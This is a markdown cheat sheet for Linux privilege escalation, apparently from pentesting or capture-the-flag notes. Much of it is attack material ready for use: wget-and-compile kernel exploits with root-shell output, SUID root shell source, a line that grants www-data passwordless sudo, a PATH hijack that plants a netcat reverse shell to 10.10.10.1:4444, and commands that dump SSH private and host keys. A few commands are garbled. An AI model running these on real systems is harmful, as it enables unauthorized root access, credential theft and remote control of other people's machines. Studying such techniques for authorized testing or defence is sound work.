# Linux Privilege Esclation

- A thorough guide to Linux enumeration https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

- Check which users can login to this box, if they use their username as their password:
```bash
grep -vE "nologin|false" /etc/passwd
```
- checking the kernel version to find kernel exploits
```bash
uname -a
searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
```
- Which applications have active connections
```bash
netstat -tulpn
```
- Services running as root
```bash
ps aux | grep root
```
- SUID/GUID variables
```bash
 find / -perm +2000 -user root -type f -print
 find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
 find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
 find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
 find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
 for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done  
 find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
 ```

- **Handy Kernel Exploits**
  - CVE-2010-2959 - 'CAN BCM' Privilege Escalation - Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32)
  ```bash
  wget -O i-can-haz-modharden.c http://www.exploit-db.com/download/14814
  $ gcc i-can-haz-modharden.c -o i-can-haz-modharden
  $ ./i-can-haz-modharden
  [+] launching root shell!
  # id
  uid=0(root) gid=0(root)
   ```

  - CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8 : </br>
  https://www.exploit-db.com/exploits/15285/

  - CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)
  ```bash
  wget -O exploit.c http://www.exploit-db.com/download/18411
  gcc -o mempodipper exploit.c  
  ./mempodipper
  ```

  - CVE-2016-5195 - **Dirty Cow** - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8 : </br>
  https://dirtycow.ninja/
  > First existed on 2.6.22 (released in 2007) and was fixed on Oct 18, 2016

- Run a command as a user other than root
```bash
sudo -u haxzor /usr/bin/vim /etc/apache2/sites-available/000-default.conf
```

- Add or change a user's password
```bash
/usr/bin/useradd -p 'openssl passwd -1 thePassword' haxzor
echo thePassword | passwd haxzor --stdin
```

- **Local Privilege Escalation Exploits (Linux)**
  - SUID

    1. SUID C shell for /bin/bash
    ```
    int main(void) {
      setresuid(0, 0, 0);
      system("/bin/bash");
    }
    ```
    2. SUID C Shell for /bin/sh
    ```
    int main(void) {
      setresuid(0, 0, 0);
      system("/bin/sh");
    }
    ```
    3. Building the SUID Shell binary
    ```bash
    gcc -o suid suid.c
    ```
    For 32 bit:
    ```bash
    gcc -m32 -o suid suid.c
    ```
  - Creating and compiling without file transfer
  ```bash
  echo "int main(void){\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/sh\");\n}" >privsc.c  
  gcc privsc.c -o privsc
  ```

- Handy command if you can get a root user to run it. Add the www-data user to Root SUDO group with no password requirement
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```

- You may find a command is being executed by the root user, you may be able to modify the system PATH environment variable to execute your command instead. In the example below, ssh is replaced with a reverse shell SUID connecting to 10.10.10.1 on port 4444.
```bash
set PATH="/tmp:/usr/local/bin:/usr/bin:/bin"
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f" >> /tmp/ssh
chmod +x ssh
```

- Searchsploit
```bash
searchsploit -uncsearchsploit apache 2.2
searchsploit "Linux Kernel"
searchsploit linux 2.6 | grep -i ubuntu | grep local
searchsploit local
```

- Kernel exploit suggestion for Kernel Version 3.0
```bash
./usr/share/linux-exploit-suggester/Linux_Exploit_Suggester.pl -k 3.0.0
```

- Precompiled kernel exploits
https://www.kernel-exploits.com/

- Find and display the root.txt or flag.txt
```bash
cat `find / -name root.txt -print`
```

- Checking kernel versions 
```
cat /proc/version
uname -a 
uname -mrs
rpm -q kernel 
dmesg | grep linux 
ls /boot | grep vmlinuz-
```

- Checking for a printer
```
lpstat -a
```

- Applications and services
```
ps aux 
ps -ef 
top 
cat /etc/service
```
```bash
# checking which services are run by root and which ones are vulnerable 

ps aux | grep root
ps -ef | grep root
```

- Checking the network configuration settings 
```
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L 
hostname 
dnsdomainname
```

- What other users and hosts are communicating with the system 
```
lsof -i 
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx 
netstat -tulpn 
chkconfig --list 
chkconfig --list | grep 3:on 
last 
```

- Checking is packet sniffing is possible 
```
# tcpdump tcp dst <ip> <port> and tcp dst <ip> <port>
tcpdump tcp dst 10.10.10.10 80 and tcp dst 10.10.10.8 21
```

- Is port forwarding possible
  - rinetd 
  - http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch

```
# fpipe 
Fpipe.exe -l [local-port] -r [remote-port] -s [local-port] [localIP]
```

```
# ssh 
ssh [-L/R] [local-port]:[remote-ip]:[remote port] [local user]@[local ip]
ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
```

```
# mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] > backpipe
mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe    # Port Relay
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
```

- Checking if tunneling is possible
```
ssh -D 127.0.0.1:9050 -N [username]@[ip]
```

- Files to look for, for user information (mail, profile)
  - /var/mail/root
  - /var/mail/username
  - /var/spool/mail/username
  - ~/.profile


- Look for private key information 
```
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```

- Check which files in '/etc/' can be written, to reconfigure a service

```
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null        # Owner
ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null          # Other

find /etc/ -readable -type f 2>/dev/null                         # Anyone
find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone 
```

- Log files to check for LFI

```
cat /etc/httpd/logs/access_log
cat /etc/httpd/logs/access.log
cat /etc/httpd/logs/error_log
cat /etc/httpd/logs/error.log
cat /var/log/apache2/access_log
cat /var/log/apache2/access.log
cat /var/log/apache2/error_log
cat /var/log/apache2/error.log
cat /var/log/apache/access_log
cat /var/log/apache/access.log
cat /var/log/auth.log
cat /var/log/chttp.log
cat /var/log/cups/error_log
cat /var/log/dpkg.log
cat /var/log/faillog
cat /var/log/httpd/access_log
cat /var/log/httpd/access.log
cat /var/log/httpd/error_log
cat /var/log/httpd/error.log
cat /var/log/lastlog
cat /var/log/lighttpd/access.log
cat /var/log/lighttpd/error.log
cat /var/log/lighttpd/lighttpd.access.log
cat /var/log/lighttpd/lighttpd.error.log
cat /var/log/messages
cat /var/log/secure
cat /var/log/syslog
cat /var/log/wtmp
cat /var/log/xferlog
cat /var/log/yum.log
cat /var/run/utmp
cat /var/webmin/miniserv.log
cat /var/www/logs/access_log
cat /var/www/logs/access.log
ls -alh /var/lib/dhcp3/
ls -alh /var/log/postgresql/
ls -alh /var/log/proftpd/
ls -alh /var/log/samba/
```

- Check for unmounted file systems 
```
cat /etc/fstab
```

- Searching for SUID/GUID executables
```
find / -perm -1000 -type d 2>/dev/null    # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the  group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the  owner, not the user who started it.

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null 


Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm
find / -writable -type d 2>/dev/null        # world-writeable folders
find / -perm -222 -type d 2>/dev/null      # world-writeable folders
find / -perm -o+w -type d 2>/dev/null    # world-writeable folders

find / -perm -o+x -type d 2>/dev/null    # world-executable folders

find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # world-writeable & executable folders
```

